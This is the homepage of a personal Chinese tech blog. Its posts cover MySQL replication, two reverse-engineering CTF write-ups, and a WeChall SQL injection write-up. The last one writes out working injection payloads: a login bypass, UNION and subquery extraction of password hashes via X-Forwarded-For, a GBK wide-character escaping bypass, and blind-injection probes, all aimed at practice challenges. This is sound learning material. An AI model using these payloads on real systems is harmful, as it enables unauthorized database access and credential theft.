<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<title>这真的是首页喵ww</title>
		<link rel="stylesheet" href="/static/init.css" type="text/css">
		<link rel="stylesheet" href="/static/yue.css" type="text/css">
		<link rel="stylesheet" href="/static/blog.css" type="text/css">
		<link rel="alternate" href="/rss.xml" type="application/rss+xml"/>
		<link rel="alternate" href="/atom.xml" type="application/atom+xml"/>
	</head>
	<body>
		<div id="page">
			<main class="yue">
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/mysql_replication.html">MySQL Replication</a></h1>
				<aside class="time">
					Posted at
					<time>2018-11-01 23:01:00</time>
				</aside>
				<section class="post-content">
					<p>因为工作原因了解了一下MySQL Replication（复制）相关的内容，然后感觉好久没写博客了，所以有了这一篇博客。说是了解了一下，但是其实也没看多久，所以如果发现错误欢迎指出～</p>

<h2>基本概念：</h2>

<ol>
<li>Binlog：MySQL 层面的log，常用于同步，审计等等。Binlog中的基本单位为Event，有几种形态：<br />

<ol>
<li>Statement Based：记录SQL语句<br /></li>
<li>Row Based：记录对表中行的修改<br /></li>
<li>Mix：优先使用Statement Based，对于Statement Based不支持的语句，使用Row Based。<br /></li>
</ol></li>
<li>WAL：存储引擎层面的log，比如Rocksdb中的WAL，InnoDB中的Redolog。<br /></li>
<li>以上两者间通过XA保证一致性<br /></li>
<li>Relay Log：Binlog在远端机器上的副本<br /></li>
<li>位点：当前复制进行到的位置，一般保存在文件或者数据库中。<br />
<br /></li>
</ol>

<h2>单机模式</h2>

<p>在单机模式下，以上几个Binlog和WAL的工作流程（从上往下为时间轴）：<br />
<img src="/static/mysql_replication/15410804526545.jpg" alt="" /><br />
当一个事务完成了Prepare并进入Commit流程后（对应最左侧SQL Commit）<br />
首先会通知存储引擎层进入Prepare状态。对于Innodb，几乎无需进行任何操作，因为修改已经写入Redolog。对于MyRocks，此时需要将内存中的WriteBatch写入WAL。<br />
在存储引擎Prepare完成后开始写入Binlog。<br />
之后依据sync_binlog参数判断是否需要将binlog刷盘。<br />
而后通知存储引擎Commit该修改。<br />
最后响应用户。</p>

<p>当发生crash时，大致有以下几种情况：</p>

<ol>
<li>Engine中已经Commit：<br />
Binlog中一定有记录，无需处理<br /></li>
<li>Engine中已经Prepared，Binlog中有记录：<br />
通知 Engine Commit<br /></li>
<li>Engine中已经Prepared ，Binlog中没有记录：<br />
通知 Engine Rollback<br /></li>
<li>Engine还没Prepare：<br />
事务还没执行完，通知 Engine Rollback<br />
<br /></li>
</ol>

<p>这样在单机条件下就可以保证Binlog和WAL即使在crash后也依旧是一致的。</p>

<h2>复制（replication）</h2>

<h3>结构</h3>

<p><img src="/static/mysql_replication/15410826823131.jpg" alt="" /><br />
首先从节点会通过IO线程向主节点注册自身。并告知主节点，自身希望从Binlog的什么位置开始复制。<br />
主节点收到从节点的注册后就会拉起一个线程开始向从节点发送数据。<br />
IO线程接收到主库发来的Events就会放进relay log<br />
SQL线程负责在从库apply这些relay log</p>

<h3>常见的几种复制模式：</h3>

<h4>异步复制：</h4>

<p><img src="/static/mysql_replication/15410812494722.jpg" alt="" /><br />
与单机模式的区别就是在通知存储引擎Prepare的同时，会推送这个事务给从节点，但并不等待从返回，直接继续。<br />
在这种模式下，从节点的log可能是与主节点不一致的，如果主节点宕机，则会丢失还未被同步到从节点的事务。</p>

<h4>半同步</h4>

<p>为了尽可能的提高主从切换之后的数据一致性，MySQL还提供了称之为半同步的模式：<br />
<img src="/static/mysql_replication/15410816484631.jpg" alt="" /><br />
与异步的主要区别是，在通知存储引擎后，必须等待至少一个从节点（新版可以配置至少等待多少个节点完成）已经将发送过去的Event落盘并回复，之后才能给用户发送响应。<br />
如果超过设定的超时时间还没有从节点反馈，则退化为异步复制。若之后又有从节点注册到主节点上，则恢复半同步复制。<br />
这样当用户完成一次写请求时，可以保证对应的数据至少已经保存在两个数据库中了。</p>

<p>然而这种流程下依然存在着问题，设想以下这种情况：<br />
<img src="/static/mysql_replication/15410818529418.jpg" alt="" /><br />
主节点到从节点的网络突然中断，两次发送的enqueue请求均没有到达从节点。而在此时主节点宕机。<br />
这样会出现两个问题：</p>

<ol>
<li>主从数据不一致。首先由于主宕机，我们会切换到从节点继续服务。当旧的主节点重新拉起后，会发现该条事务同时出现在Binlog和WAL中，故会通知引擎层Commit该事务。然而该事务在新的主节点（旧的从节点）上并不存在，进而导致旧的主节点无法与新的主节点（旧的从节点）建立同步关系。<br /></li>
<li>幻读。当存储引擎层Commit后，该事务造成的修改就对读请求可见了，然而主从切换之后，新的主节点（旧的从节点）并没有该条事务的记录。从客户端的视角来看就是之前能读取的数据突然不见了，也就是幻读了。注意主节点宕机时并未Respond该写事务，所以并不是数据丢失。<br />
<br /></li>
</ol>

<h4>增强（无损）半同步</h4>

<p>为了解决以上问题MySQL又引入了增强（无损）半同步。<br />
<img src="/static/mysql_replication/15410826165858.jpg" alt="" /><br />
大致改动就是在存储引擎层Commit之前就要得到从节点的回复，进而解决了以上的问题。</p>

<h4>全同步模式</h4>

<p>国内大部分对于MySQL的改造版基本都引入了全同步模式/强同步模式/最大保护（Max Protection）模式<br />
与半同步的主要不同是当超时时间内无从节点回复时，不回退至异步模式，而是停止服务，直到有从节点接收到该事务并回复。<br />
主要用于对一致性要求较高的场景，并常通过使用多个备节点来增加可用性。</p>

<h3>从节点 Crash Safe</h3>

<p>如果从节点发生crash，最直接的问题就是relaylog的位点可能和relaylog不吻合（先写入了relaylog，还没来得及更新位点就崩了）。同理SQL线程执行的位置也有可能和SQL位点不吻合。<br />
MySQL采取的改进方式也很直接：将位点保存在数据库中，从而构造一个事务，通过事务的原子性来保证位点的更新和相关的操作是原子的。</p>

<p><code>//写累了，以下等有空来补</code></p>

<hr />

<h3>GTID</h3>

<h3>性能优化</h3>

<p>由于半同步模式必须等待从节点返回，所以延迟会比异步模式高。当然“延迟不应该影响吞吐”，所以MySQL为了半同步模式下的吞吐做了很多优化。</p>

<h4>Group Commit</h4>

<h5>并行apply</h5>

<h4>异步传输binlog</h4>

<h3>HA</h3>

<h4>GitHub October 21 Incident</h4>

				</section>
			</article>
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/geekpwnctf_hugme.html">GeekPwnCTF2016 qual HugMe-300</a></h1>
				<aside class="time">
					Posted at
					<time>2016-09-25 12:26:00</time>
				</aside>
				<section class="post-content">
					<p>一个加了壳的swf(后来知道是doswf的壳)</p>

<p>先preload挂个TheMiner，然后看loader的内容，脱去第一层壳。</p>

<p><img src="/static/hugme/14747777552556.jpg" alt="" /></p>

<p>反编译取出的swf，发现一个坑<br />
<img src="/static/hugme/14747780161994.jpg" alt="" /><br />
显示出来的hugme啥用都没有。。。需要点击的那个hugme又没被正确加载。。需要自己做修改<br />
然后才能看见真正的按钮<br />
<img src="/static/hugme/14747781328451.jpg" alt="" /></p>

<p>接着关键的判断逻辑。<br />
<img src="/static/hugme/14747778722896.jpg" alt="" /><br />
然而Verify运行时才载入。。<br />
<img src="/static/hugme/14747782423072.jpg" alt="" /><br />
于是再次脱壳。。。TheMiner没hook loadBytes,所以这里只能自己来<br />
提取出这个函数运行然后把uncompress的结果base64一下，trace打出来。<br />
然后再用python保存成文件。(不会actionscript的文件读写只好这么搞)</p>

<p>然后反编译保存下来的文件，发现校验过程其实就是个方程组<br />
<img src="/static/hugme/14747785230624.jpg" alt="" /><br />
method3没用。。只要符合method2里的方程组，method3一定符合。</p>

<p>然后就是求解方程组得到一组解[14,0,1,14,14,14,13,0,9,3,12,11,2,2,11]<br />
对应的flag e01eeed093cb22b<br />
然而这才15位 。。根据readme的提示，枚举最后一位。。发现e01eeed093cb22bb是hello world的md5</p>

<p>故flag为e01eeed093cb22bb</p>

				</section>
			</article>
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/reversing_kr_autohotkey2.html">reversing.kr AutoHotkey2</a></h1>
				<aside class="time">
					Posted at
					<time>2016-02-15 22:30:00</time>
				</aside>
				<section class="post-content">
					<p>有autohotkey自带的upx壳<br />
<img src="/static/upx.png" alt="upx" /><br />
还有自校验。。</p>

<p>这题给的文件是修改过的，所以无法通过自校验<br />
<img src="/static/corrupt.png" alt="corrupt" /></p>

<p>考虑到有自校验，所以就没有先脱壳。<br />
直接带壳调试，用堆栈平衡很快找到OEP=00442B4F<br />
<img src="/static/oep.png" alt="oep" /></p>

<p>然后可以看到第一个关键跳转：<br />
<img src="/static/check1.png" alt="check1" /><br />
448265必须跳<br />
跟进4508C7，是在计算校验值，并判断。<br />
<img src="/static/check_cmp1.png" alt="check_cmp1" /><br />
ebp-0x10其实是文件的最后四个字节<br />
<img src="/static/checksum1.png" alt="checksu" /><br />
所以文件的最后四个字节是计算出的校验值异或0xAAAAAAAA之后得到的值</p>

<p>程序接下来直接利用文件倒数第八到倒数第五个字节作为附加数据开始地址，读取附加数据开头，然后开始判断是否为附加数据,即判断开头是否是以下16个字节<br />
A3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D<br />
<img src="/static/check2.png" alt="check2" /><br />
所以文件的倒数第八到倒数第五个字节是附加数据开始地址<br />
用16进制编辑器可以找到真正的附加数据开头<br />
<img src="/static/offest1.png" alt="offest1" /><br />
然后只需要修正文件的最后8个字节即可，注意修改附加数据地址也会改变校验值，所以应该先修改附加数据地址，再修改校验值。<br />
最后的修改如下<br />
<img src="/static/patch-1.png" alt="patch" /><br />
然后程序就能正常运行了<br />
<img src="/static/result.png" alt="result" /><br />
百度一下即可找到答案jonsnow</p>

<h2>参考文章</h2>

<p><a href="http://bbs.pediy.com/showthread.php?threadid=21910">简析AutoIt程序脱壳后的自校验处理_看雪</a><br />
（这篇文章里讲的是autoit的自校验，比autohotkey的稍微复杂一些（多了一次校验），但是基本方法是一样的，当时看这个文章得到不少思路）</p>

				</section>
			</article>
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/wechall_sql.html">Wechall SQLI</a></h1>
				<aside class="time">
					Posted at
					<time>2015-11-09 12:00:00</time>
				</aside>
				<section class="post-content">
					<p>这些题是为了准备安恒杯校内个人赛做的，<del>虽然后来还是没做出安恒杯的sql注入（据说只要用sqlmap扫就行？）</del></p>

<h2>MySQL1</h2>

<p>基础入门题<br />
username完全无过滤，可以直接去掉密码验证<br />
查询语句</p>

<pre><code class="language-sql">SELECT * FROM users WHERE username='$username' AND password='$password'
</code></pre>

<p>构造：</p>

<pre><code class="language-sql">SELECT * FROM users WHERE username='admin' or ''='' AND password='$password'
</code></pre>

<p>传说中的万能密码的原理  admin&rsquo; or &ldquo;=&rsquo;</p>

<h2>MySQL2</h2>

<p>依然基础题，南邮的平台上遇到过类似的。<br />
先用用户名取出密码，然后比对密码。只要让sql语句返回一个假的密码就OK了。<br />
查询语句：</p>

<pre><code class="language-sql">SELECT * FROM users WHERE username='$username'
</code></pre>

<p>构造：</p>

<pre><code class="language-sql">SELECT * FROM users WHERE username='admin' and 1=2 union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'
</code></pre>

<p>注意PHP的md5函数得到的是32位小写的md5</p>

<h2>The Guestbook</h2>

<pre><code class="language-sql">INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '$ip', '$message')
</code></pre>

<p>ip message都是注入点。<br />
ip好像不太好注入。<br />
message可以注。<br />
构造：</p>

<pre><code class="language-sql">INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '$ip', 'aaa') #')
</code></pre>

<p>然而有一个<code>mysql_real_escape_string</code>，会自动转译。搜了一下可以通过宽字符绕过。</p>

<p>例子：</p>

<pre><code class="language-php">&lt;?php  
    header('Content-Type: text/html; charset=GBK');  
    $input = chr(0xbf) . chr(0x27) . ' OR username = username; /*';  
    $value = addslashes($input);  
    $sql = &quot;SELECT * FROM users WHERE username='{$value}' AND password='123123';&quot;;  
  
    echo $value;  
    echo '&lt;br&gt;';  
    echo $sql;  
    echo '&lt;br&gt;';  
</code></pre>

<p>chr(0xbf) 和 chr(0x27)相连接, 构成一个双字节字符(0xbf27)… 而0xbf27只是一个人为合成的双字节, 不在GBK编码表里, 也就是说不是一个合法的GBK双字节字符… 系统（mysql）会把这个双字节拆分为2个单字节解析(也就是0xbf和0x27), 而<code>addslashes</code>并不知道它是非法的双字节字符, 单引号的GBK编码就是chr(0x27), 单独使用使<code>addslashes</code>是可以识别的&hellip;</p>

<p>然而这个洞已经在mysql5.0.x修复了。。作罢</p>

<p>只能从IP注入了。。上burpsuite，加一个X-Forwarded-For</p>

<p>构造：</p>

<pre><code class="language-sql">INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '127.0.0.1',(select gbu_password from gbook_user where  gbu_name='admin'))#‘, '$message')
</code></pre>

<p>其实中间复习了一波sql语句。。但是没搞懂怎么在insert语句里用select的结果。。后来发现加一对括号足以。。。</p>

<h2>No Escape</h2>

<p>要刷票233333<br />
关键语句：</p>

<pre><code class="language-sql">UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1
</code></pre>

<p>构造：</p>

<pre><code class="language-sql">UPDATE noescvotes SET `george`=`george`+100 #`=`george`+1 WHERE id=1
</code></pre>

<p>实际的url参数：</p>

<pre><code class="language-url">?vote_for=george`=`george`%2b111%23
</code></pre>

<p>注意url转义</p>

<h2>Blinded by the light</h2>

<p>目标是获取  an md5 password hash<br />
盲注<br />
关键语句</p>

<pre><code class="language-sql">SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'
</code></pre>

<p><code>'union select '1'#</code>直接可以登陆，然而它要密码。。<br />
<code>'or'1'='1'#</code>正确的情况<br />
<code>'or'1'='2'#</code>错误的情况<br />
<code>'or password=password#</code><br />
发现生成的hash只有ABCDEF0123456789这些字符，就是一个32位的16进制的数<br />
<code>'or password=0#</code>正确。。<br />
弃治看题解。。<br />
题解提到了一个sql函数substring。。<br />
于是去补了一通sql函数</p>

<pre><code class="language-sql">CONCAT( 字串1, 字串2, 字串3, ...)  
SUBSTR (str, pos, len) 
SUBSTR (str, pos)
TRIM（）
Length (str)
REPLACE (Region_Name, 'ast', 'astern')
</code></pre>

<p><code>#</code>是个很不靠谱的注释符号<br />
还是用<code>--</code>比较好</p>

<p>最后的解法是二分猜解<br />
解题代码直接看乌云的题解吧。。。</p>

<h2>参考资料</h2>

<p><a href="http://drops.wooyun.org/tips/7299">MySQL注入技巧_乌云</a><br />
<a href="http://drops.wooyun.org/papers/1321">wechall mysql关卡题解_乌云</a></p>

				</section>
			</article>
			
			<article>
				<h1 class="title"><a href="http://blog.wangxiyu.me/articles/hello_blogo.html">Hello Blogo</a></h1>
				<aside class="time">
					Posted at
					<time>2015-10-10 09:42:00</time>
				</aside>
				<section class="post-content">
					<p>这个叫blogo的静态博客生成器终于算是基本完成了，这篇文章的发布时间使用的是blogo第一个commit的时间，仔细一看确实是拖了好久啊。现在(1457181826)终于把这个坑填完了。。</p>

<p>一直认为博客的程序应该要自己写，断断续续写了好多。。拿dw点出来的ASP+Access的版本啊，PHP的版本啊，node的版本啊，一直到现在这个Go写的Blogo。</p>

<p>然而前面的那些都因为各种原因只在本地跑过，从未真正可以被外界访问。这个Blogo是第一个真正投入使用的版本。看到博客成功被push到Github上的时候很开心啊。</p>

<p>评论部分暂且用了多说，不排除未来用disqus的可能性。</p>

<p>最后是一波感谢：<br />
生成器部分参考了天天大神的<a href="https://github.com/whtsky/Catsup">Catsup</a><br />
前端参考了萝莉聚聚的<a href="http://www.ricter.me">ricter.me</a><br />
灰常感谢</p>

<hr />

<p>你问背景是谁？背景是我头像的女票。没错。。头像的。。我头像有女票你怕不怕<del>(好像是个悲伤的故事)</del>233333</p>

				</section>
			</article>
			
			</main>
			<div id="right">
				<div id="float">
					<img id="logo" src="/static/logo.jpg">
					<p class="name">Wxy's</p>
					</img>
					
					<nav>
						<ul>
							<li class="now"><a href="">Home</a></li>
							<li><a href="/archive.html">Archives</a></li>
							<li><a href="/links.html">Links</a></li>
							<li><a href="/about.html">About</a></li>
						</ul>
					</nav>
				</div>
			</div>
		</div>
		<footer id="footer">
			Powered by Blogo
		</footer>
		<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.0.0/styles/default.min.css">
		<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
	</body>
</html>